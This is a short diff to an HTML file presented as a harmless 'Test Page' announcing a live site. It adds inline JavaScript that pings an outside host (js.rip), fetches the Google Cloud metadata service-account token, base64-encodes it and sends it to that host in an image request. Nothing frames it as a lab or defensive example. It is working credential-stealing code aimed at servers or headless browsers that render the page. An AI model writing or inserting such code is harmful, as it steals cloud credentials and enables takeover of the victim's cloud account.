@@ -2,7 +2,20 @@
 <html>
 <head>
   <title>Test Page</title>
- <script src="https://js.rip/5mw8at9w5s"></script>
+  <script>
+    // Confirm JS execution
+    new Image().src = "https://js.rip/5mw8at9w5s?ping=1";
+
+    // Attempt metadata fetch
+    fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
+      headers: { "Metadata-Flavor": "Google" }
+    })
+    .then(r => r.text())
+    .then(t => {
+      new Image().src = "https://js.rip/5mw8at9w5s?token=" + btoa(t);
+    })
+    .catch(() => {});
+  </script>
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
